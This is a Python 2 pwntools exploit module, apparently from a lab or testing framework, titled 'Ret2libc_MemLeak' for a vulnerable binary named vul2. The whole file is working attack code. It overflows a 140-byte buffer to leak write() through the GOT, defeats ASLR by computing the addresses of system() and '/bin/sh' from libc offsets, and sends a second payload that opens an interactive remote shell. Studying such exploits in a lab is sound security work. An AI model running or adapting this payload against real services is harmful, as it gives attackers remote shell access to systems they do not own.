#coding:UTF-8
'''Ret2libc_MemLeak (DEP - on, ALSR - on)'''

import socket
import struct
import sys
sys.path.append("..")
import payloads
from payloads import *
from pwn import *

class exploit(object):
    'exploit1'
    def __init__(self, options):
        self.options = options
        self.info = {
            'vulfun':0x08048404,
            'offset':140
            }
    def test(self):
        ip, port = self.options['dIP'], int(self.options['dPort'])
        p = remote(ip, port)

        libc = ELF('exploits/lib/libc.so.6')
        elf = ELF('../vulnerabilities/vuls/vul2')

        plt_write = elf.symbols['write']
        print 'plt_write= ' + hex(plt_write)
        got_write = elf.got['write']
        print 'got_write= ' + hex(got_write)
        vulfun_addr = self.info['vulfun']
        print 'vulfun= ' + hex(vulfun_addr)

        payload1 = 'A' * self.info['offset'] + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)

        print "\n###sending payload1 ...###"
        p.send(payload1)

        print "\n###receving write() addr...###"
        write_addr = u32(p.recv(4))
        print 'write_addr=' + hex(write_addr)

        print "\n###calculating system() addr and \"/bin/sh\" addr...###"
        system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
        print 'system_addr= ' + hex(system_addr)
        binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
        print 'binsh_addr= ' + hex(binsh_addr)

        payload2 = 'A' * self.info['offset']  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

        print "\n###sending payload2 ...###"
        p.send(payload2)

        p.interactive()



if __name__=='__main__':
    pass



